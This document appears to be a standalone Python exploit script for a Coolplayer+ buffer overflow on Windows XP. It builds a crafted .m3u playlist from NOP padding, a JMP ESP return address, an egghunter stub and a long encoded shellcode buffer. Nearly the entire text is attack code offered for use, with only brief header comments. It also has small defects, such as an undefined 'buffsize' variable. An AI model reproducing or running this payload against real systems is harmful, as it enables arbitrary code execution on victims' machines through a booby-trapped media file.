# Author: Michael Music
# Date: 9/18/2019
# Description: Coolplayer+ Buffer Overflow Exploit
#  Tested on Windows XP
# Notes: An abnormal shellcode location within ESP allows for creating ways of
#  launching shellcode.
#  App must be installed, launched at C:/
#  m3u file must be located at C:/

# Found a JMP ESP at 0x7e429353 within user32.dll

egghunter = '\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8' + '\x77\x30\x30\x74' + '\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7'

buf =  ""
buf += "\xdb\xce\xd9\x74\x24\xf4\x58\x29\xc9\xbb\x34\xf5\xf0"
buf += "\x99\xb1\x52\x31\x58\x17\x83\xe8\xfc\x03\x6c\xe6\x12"
buf += "\x6c\x70\xe0\x51\x8f\x88\xf1\x35\x19\x6d\xc0\x75\x7d"
buf += "\xe6\x73\x46\xf5\xaa\x7f\x2d\x5b\x5e\x0b\x43\x74\x51"
buf += "\xbc\xee\xa2\x5c\x3d\x42\x96\xff\xbd\x99\xcb\xdf\xfc"
buf += "\x51\x1e\x1e\x38\x8f\xd3\x72\x91\xdb\x46\x62\x96\x96"
buf += "\x5a\x09\xe4\x37\xdb\xee\xbd\x36\xca\xa1\xb6\x60\xcc"
buf += "\x40\x1a\x19\x45\x5a\x7f\x24\x1f\xd1\x4b\xd2\x9e\x33"
buf += "\x82\x1b\x0c\x7a\x2a\xee\x4c\xbb\x8d\x11\x3b\xb5\xed"
buf += "\xac\x3c\x02\x8f\x6a\xc8\x90\x37\xf8\x6a\x7c\xc9\x2d"
buf += "\xec\xf7\xc5\x9a\x7a\x5f\xca\x1d\xae\xd4\xf6\x96\x51"
buf += "\x3a\x7f\xec\x75\x9e\xdb\xb6\x14\x87\x81\x19\x28\xd7"
buf += "\x69\xc5\x8c\x9c\x84\x12\xbd\xff\xc0\xd7\x8c\xff\x10"
buf += "\x70\x86\x8c\x22\xdf\x3c\x1a\x0f\xa8\x9a\xdd\x70\x83"
buf += "\x5b\x71\x8f\x2c\x9c\x58\x54\x78\xcc\xf2\x7d\x01\x87"
buf += "\x02\x81\xd4\x08\x52\x2d\x87\xe8\x02\x8d\x77\x81\x48"
buf += "\x02\xa7\xb1\x73\xc8\xc0\x58\x8e\x9b\x2e\x34\x91\x5c"
buf += "\xc7\x47\x91\x63\xac\xc1\x77\x09\xc2\x87\x20\xa6\x7b"
buf += "\x82\xba\x57\x83\x18\xc7\x58\x0f\xaf\x38\x16\xf8\xda"
buf += "\x2a\xcf\x08\x91\x10\x46\x16\x0f\x3c\x04\x85\xd4\xbc"
buf += "\x43\xb6\x42\xeb\x04\x08\x9b\x79\xb9\x33\x35\x9f\x40"
buf += "\xa5\x7e\x1b\x9f\x16\x80\xa2\x52\x22\xa6\xb4\xaa\xab"
buf += "\xe2\xe0\x62\xfa\xbc\x5e\xc5\x54\x0f\x08\x9f\x0b\xd9"
buf += "\xdc\x66\x60\xda\x9a\x66\xad\xac\x42\xd6\x18\xe9\x7d"
buf += "\xd7\xcc\xfd\x06\x05\x6d\x01\xdd\x8d\x93\xf3\xef\x1b"
buf += "\x03\xaa\x9a\x61\x49\x4d\x71\xa5\x74\xce\x73\x56\x83"
buf += "\xce\xf6\x53\xcf\x48\xeb\x29\x40\x3d\x0b\x9d\x61\x14"

junk = '\x43' * 4
junk += '\x90' * (197 - 4)
junk += '\x53\x93\x42\x7e'
junk += '\x90' * 8
junk += egghunter
junk += '\x90' * 50
junk += 'w00tw00t'
junk += buf
junk += '\x90' * (buffsize - len(junk))

exploit_string = junk

text = open('exploit.m3u', 'wb')
text.write(exploit_string)
text.close
